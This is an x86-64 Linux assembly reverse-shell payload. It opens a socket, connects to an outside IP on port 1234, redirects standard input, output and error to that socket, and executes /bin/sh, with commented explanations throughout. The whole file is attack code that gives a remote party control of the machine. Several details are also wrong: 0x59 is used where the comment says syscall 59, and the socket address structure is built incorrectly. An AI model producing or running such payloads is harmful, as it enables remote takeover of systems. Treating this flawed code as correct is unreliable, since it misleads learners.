global _start

section .text

_start:


;Reference : rdi,rsi,rdx,r10,r8,r9

;Deal with socketfd first
;syscall for socket is 41
;int socket(int domain, int type, int protocol);
;AF_INET has value of 2
;SOCK_STREAM has value 1

xor rdi, rdi ; rdi=0
xor rsi, rsi
xor rdx, rdx
add rdi, 0x2
inc rsi
xor rax, rax ; rax = 0
mov al, 0x29 ; initialize to 41
syscall	; execute socket and value of sockfd is stored in rax

;mysockaddr.sin_family = AF_INET;
;mysockaddr.sin_port = htons(port);
;mysockaddr.sin_addr.s_addr = inet_addr("172.22.174.36"); //Random fake address

;AF_INET is stored in rdi
; 172.22.174.36 is \x24\xae\x16\xac which is doubleword
; Push from bottom up since it is in a stack and a pointer reference
; htons of port 1234 is python -c "hex(socket.htons(1234))" which is 0xd204

xor rcx, rcx
mov rcx, 0x24ae16ac ; 
push rcx ; Store value of ip address on stack
xor rbx, rbx;
mov bx, 0xd204 ; 
push rbx 
push rdi ; since rdi already stores the value of IF_INET which is 2

;connect syscall is 42

xor rdx, rdx
mov dl, 0x10; sizeof sockaddr is 16
mov rsi, rsp ; Put the structure pointer into second argument
mov rdi, rax
xor rax, rax
add rax, 42
syscall ;	 Call connect function syscallconnect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));

;syscall number for dup2 -- duplicate file descriptor
; is 33
; dup2(sockfd, 0)

;sockfd is still stored in rdi so there is no neeed to change rdi
xor rsi, rsi
mov al, 0x21
syscall ; dup2(sockfd,0)

mov al, 0x21
inc rsi
syscall ; dup2(sockfd,1)

mov al, 0x21
inc rsi
syscall ; dup2(sockfd,2)


;Now is on to execve syscall - value 59

;stringg="//bin/sh"
;stringg[::-1].encode("hex")
;which gives '68732f6e69622f2f'

mov rax, 0x68732f6e69622f2f
push rax ; onto stack
mov rdi, rsp ; move "/bin/sh" as first argument
xor rbx,rbx
push rbx ; NULL
push rdi ; /bin/sh onto stack as the argv
xor rdx,rdx; NULL
xor rax, rax
add rax, 0x59 ; insert syscall number eecve
syscall; execute syscall

xor rax,rax
mov al, 0x3c
mov dl , 0x0
syscall ; EXIT FROM PROGRAM



